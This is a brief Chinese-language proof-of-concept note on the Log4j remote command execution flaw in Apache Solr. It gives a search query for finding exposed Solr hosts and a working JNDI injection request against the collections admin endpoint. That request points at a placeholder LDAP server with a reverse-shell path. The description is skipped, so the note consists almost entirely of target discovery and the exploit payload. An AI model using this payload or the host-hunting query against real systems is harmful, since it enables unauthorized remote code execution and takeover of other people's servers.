# Apache Solr Log4j 组件 远程命令执行漏洞 

## 漏洞描述

Apache Solr Log4j 组件 远程命令执行漏洞，详情略

## 漏洞影响

```
Apache Solr
```

## 网络测绘

```
app="APACHE-Solr"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326120445853.png)

验证 POC

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326120445854.png)
